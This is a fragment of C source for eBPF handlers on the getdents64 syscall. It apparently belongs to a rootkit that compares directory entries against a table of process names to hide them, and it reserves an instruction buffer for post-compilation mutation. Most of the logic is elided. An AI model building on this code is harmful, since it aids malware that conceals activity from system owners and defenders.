...
/*const char PADDING[] = "owowowowowowowowowowowowowowowowowowowowowowow\
                        owowowowowowowowowowowowowowowowowowowowowowow\
                        owowowowowowowowowowowowowowowowowowowowowowow\
                        owowowowowowowowowowowowowowowowowowowowowowow\
                        owowowowowowowowowowowowowowowowowowowowowowow\
                        owowowowowowowowowowowowowowowowowowowowowowow\
...
int BPF_getdents64_enter(struct trace_event_raw_sys_enter * arg) {
    ...
    /* tricking the compiler here into generating a buffer of unused instructions
     * args[0] is a fd, it should *never* equal 471232, so its safe to overwrite 
     * these instructions post compilation. The result is a buffer in this section 
     * of the ELF, which can be used for mutations.
     *
     * the alternative is to manually rebuild the ELF file. that takes much longer.
     */
    unsigned long x = arg->args[1];
    if (arg->args[0] != x) {
        return 0;
    } else {
...
int BPF_getdents64_exit(struct trace_event_raw_sys_exit * arg) {
    ...
    for (int i = 0; i < 64; i++) {
        ...
        for (u32 j = 0; j < PID_NAME_ENTRIES; j++) {
            ...
            //TODO debug
            bpf_printk("\ncomparing: '%s' vs '%s'\nd_name->len: %u vs k: %u \n", 
                       filename, current_d_name->name, 
                       (u32) current_d_name->len, (u32) k);
            //TODO debug end
